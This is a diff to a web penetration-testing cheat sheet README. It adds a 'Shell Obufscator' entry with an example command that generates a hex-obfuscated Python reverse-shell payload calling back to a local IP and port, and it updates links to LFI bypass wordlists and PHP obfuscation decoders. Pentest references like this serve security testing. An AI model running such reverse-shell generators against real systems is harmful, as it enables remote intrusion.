@@ -95,13 +95,18 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 "3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."
 
-https://3v4l.org/
+https://3v4l.org/  
+
 
 ### PHP Obfuscation Decoders 
 
-https://malwaredecoder.com/
-
+https://malwaredecoder.com/  
 https://hackvertor.co.uk/public
+
+### Shell Obufscator
+e.g.  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
+e.g.  
 
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
 
@@ -758,7 +763,7 @@ https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI
 ### Payloads for bypass:
 
 -> bypass_lfi.txt  
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/bypass_lfi.txt
+https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt
 
 ### Wordlist for parameter fuzzing
   
